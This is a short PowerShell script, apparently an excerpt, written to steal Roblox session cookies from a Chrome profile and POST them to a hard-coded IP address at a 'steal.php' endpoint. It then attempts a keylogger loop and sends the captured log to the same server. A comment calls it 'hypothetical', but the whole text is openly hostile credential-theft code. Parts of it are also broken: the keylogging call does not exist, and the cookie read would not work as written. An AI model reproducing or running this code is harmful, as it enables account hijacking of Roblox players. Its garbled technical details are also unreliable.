     # Steal Roblox cookies from Chrome (hypothetical - AV will block)
     $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
     if (Test-Path $chromePath) {
         $cookies = Get-Content $chromePath | Select-String "roblox.com" | Out-String
         Invoke-WebRequest -Uri "http://76.112.215.80:8080/steal.php" -Method POST -Body $cookies
     }
     # Or keylog for passwords
     Add-Type -AssemblyName System.Windows.Forms
     while ($true) { 
         if ([System.Windows.Forms.Control]::MouseButtons -band [System.Windows.Forms.MouseButtons]::Left) { 
             # Log keystrokes - simplified
             $log += [System.Windows.Forms.SendKeys]::GetKeystroke()
         }
         Start-Sleep -Milliseconds 10
     }
     # Send log to your server
     Invoke-WebRequest -Uri "http://76.112.215.80:8080/log.php" -Method POST -Body $log
